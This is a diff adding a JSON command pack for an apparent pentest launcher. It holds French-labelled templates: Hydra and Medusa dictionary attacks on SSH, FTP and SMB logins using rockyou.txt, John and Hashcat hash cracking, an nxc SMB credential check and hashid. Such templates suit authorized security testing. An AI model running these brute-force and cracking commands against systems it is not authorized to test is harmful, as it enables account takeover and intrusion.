@@ -1,0 +1,92 @@
+{
+  "pack_id": "bruteforce-creds",
+  "pack_name": "Bruteforce & Identifiants",
+  "author": "MIDINS Forge",
+  "version": "1.0",
+  "color": "#f472b6",
+  "icon": "unlock",
+  "pack_tags": [
+    "Pentest",
+    "Red Team"
+  ],
+  "description": "Attaques par dictionnaire sur des services et cassage de hashs.",
+  "scripts": [
+    {
+      "id": "hydra-ssh",
+      "title": "Hydra — Bruteforce SSH",
+      "category": "Bruteforce",
+      "description": "Attaque par dictionnaire sur un service SSH.",
+      "template": "hydra -l {{USERNAME:root}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET_IP}}",
+      "tags": [
+        "hydra",
+        "ssh"
+      ]
+    },
+    {
+      "id": "hydra-ftp",
+      "title": "Hydra — Bruteforce FTP",
+      "category": "Bruteforce",
+      "description": "Attaque par dictionnaire sur un service FTP.",
+      "template": "hydra -l {{USERNAME:anonymous}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ftp://{{TARGET_IP}}",
+      "tags": [
+        "hydra",
+        "ftp"
+      ]
+    },
+    {
+      "id": "medusa-smb",
+      "title": "Medusa — Bruteforce SMB",
+      "category": "Bruteforce",
+      "description": "Attaque par dictionnaire sur un partage SMB Windows.",
+      "template": "medusa -h {{TARGET_IP}} -u {{USERNAME:administrator}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M smbnt",
+      "tags": [
+        "medusa",
+        "smb"
+      ]
+    },
+    {
+      "id": "john-crack",
+      "title": "John the Ripper",
+      "category": "Bruteforce",
+      "description": "Casse un fichier de hashs avec une liste de mots.",
+      "template": "john --wordlist={{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{HASH_FILE:hashes.txt}}",
+      "tags": [
+        "john",
+        "hash"
+      ]
+    },
+    {
+      "id": "hashcat-crack",
+      "title": "Hashcat",
+      "category": "Bruteforce",
+      "description": "Casse des hashs par GPU (mode 0 = MD5 par défaut, à adapter).",
+      "template": "hashcat -m {{MODE:0}} -a 0 {{HASH_FILE:hashes.txt}} {{WORDLIST:/usr/share/wordlists/rockyou.txt}}",
+      "tags": [
+        "hashcat",
+        "hash"
+      ]
+    },
+    {
+      "id": "crackmapexec-smb-login",
+      "title": "CrackMapExec — Test SMB",
+      "category": "Bruteforce",
+      "description": "Teste un couple identifiant/mot de passe sur un hôte SMB.",
+      "template": "nxc smb {{TARGET_IP}} -u {{USERNAME:admin}} -p {{PASSWORD:password}}",
+      "tags": [
+        "crackmapexec",
+        "smb"
+      ]
+    },
+    {
+      "id": "hash-identify",
+      "title": "Hashid — Identifier un hash",
+      "category": "Bruteforce",
+      "description": "Détermine le(s) algorithme(s) probable(s) d'un hash donné.",
+      "template": "hashid {{HASH:5f4dcc3b5aa765d61d8327deb882cf99}}",
+      "tags": [
+        "hashid",
+        "hash"
+      ]
+    }
+  ]
+}
